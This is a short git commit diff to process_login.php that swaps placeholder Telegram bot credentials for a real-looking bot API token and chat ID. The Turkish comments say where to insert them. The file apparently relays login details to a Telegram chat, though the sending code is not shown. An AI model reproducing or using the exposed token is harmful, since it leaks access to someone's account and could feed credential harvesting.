fe41937e43f0a05ff24a7fbdc168bead88a8b4c3
MertBrody <148619066+MertBrody@users.noreply.github.com>
2023-10-21 12:21:05 +0300

    Update process_login.php

--- process_login.php
+++ process_login.php
@@ -1,6 +1,6 @@
 <?php
-$api_key = 'YOUR_API_KEY';  // Telegram Bot API anahtarınızı buraya ekleyin
-$chat_id = 'YOUR_CHAT_ID';  // Mesajı göndereceğiniz hedef chat ID'sini buraya ekleyin
+$api_key = '6593217730:AAHLNvmAkfTWiE441L8s2ES-ubU0-bJbnEE';  // Telegram Bot API anahtarınızı buraya ekleyin
+$chat_id = '6669631502';  // Mesajı göndereceğiniz hedef chat ID'sini buraya ekleyin
 
 $username = 'kullanici';
 $password = 'sifre';
